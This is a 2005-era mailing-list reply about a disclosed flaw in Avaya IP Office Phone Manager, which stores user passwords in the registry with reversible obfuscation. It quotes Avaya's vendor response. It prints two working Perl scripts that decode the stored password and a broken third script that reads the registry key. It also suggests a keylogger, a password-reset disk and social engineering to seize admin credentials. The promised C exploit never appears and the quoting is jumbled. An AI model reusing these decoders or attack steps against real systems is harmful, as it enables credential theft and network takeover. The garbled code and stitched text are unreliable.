Subject: RE: Avaya IP Office Phone Manager - Sensitive Information Cleartext Vulnerability




In my case the key is stored under HKEY_LOCAL_MACHINE

Also, please let's remember that even in the case that the key was stored under HKEY_CURRENT_USER , sensitive information should NEVER be cleartext since an attacker could gain administrative privileges to a single host or even entire Windows network.

It only takes an ERD (Emergency Repair Disk) such as CHNTPW, a good keylogger such as Keykey and a little bit of social engineering (to make the admin login on the machine where the keylogger is running) to grab the administrator's password and gain total control of a host or entire network in the case that domain authentication was used (DOMAIN\USERNAME)

Here is an exploit written in Win32/C with some comments:

Avaya is aware and currently investigating this issue.  Once our
investigation is complete we will release an Avaya Security Advisory to
address the outlined concerns.  In the interim, we've asked Mitre to
assign a Common Vulnerability and Exposures (CVE) candidate number for
this issue.  They have assigned CAN-2005-0506:
 
http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2005-0506

Congruent with generally acceptable security practices, Avaya recommends
that customers restrict remote and local access to their systems to
reduce risks.  Alternatively, customers may choose not to utilize the
"Remember save password" feature in order to prevent a user's password
from being stored in the Windows registry.  

Please note the Avaya Product Security Support Team (PSST) takes the
security of Avaya products seriously.  We would like to develop a
relationship with our customers and the public to encourage them to
forward vulnerabilities to us.  Please send information regarding any
discovered security problems with Avaya products to
securityalerts[at]avaya.com.  I, or someone on the PSST, will work
directly to validate the problem and coordinate a response; including an
acknowledgement for working with us to help protect customers.

You suspect correctly.

Our values were found in a different registry location but i'm willing
to bet
the obfuscation is the same. One method of attack is to simply place the
stored 
password in your own registry and hit connect. It's only there because
people
are lazy and just want their phones to work. It's easily reversable:

 ----- 8< --- [ snippy snippy bad code ] --- >8 ----

#!/usr/bin/perl
$avayapw=shift;

my $pwlength = ord(substr($avayapw, 0, 1)) - 33;
my $startpoint = ($pwlength * 7) % 55;

print "Password length: $pwlength\n";
print " Start position: $startpoint\n";

print "\nYour password is: " . substr($avayapw, $startpoint, 1);
my $byte = $startpoint;
for ( my $a = 1; $a<$pwlength; $a++) {
  $nextbyte = $byte - 7;
  if ($nextbyte < 0) {
    $nextbyte = 55 - (7 - $byte);
  }
  $byte = $nextbyte;
  print substr($avayapw, $byte, 1);
}

 ----- 8< --- [ snippy snippy bad code ] --- >8 ----

Shorter:

#!/usr/bin/perl
$a=shift;
$l=ord(substr($a,0,1))-33;
for $c ( 1 .. $l ) {
  print substr($a, (((($l-$c)+1)*7)%55), 1);
}

 ----- 8< --- [ snippy snippy bad code ] --- >8 ----

And something more fun:

#!/usr/bin/perl

use Win32::Registry;

$::HKEY_CURRENT_USER->Open("Software\\Avaya\\iClarity\\Options", $hKey)
or die "Can't open: $^E\n";
$l=ord(substr($value,0,1))-33;
for $c ( 1 .. $l ) {
  print substr($a, (((($l-$c)+1)*7%55), 1);
}
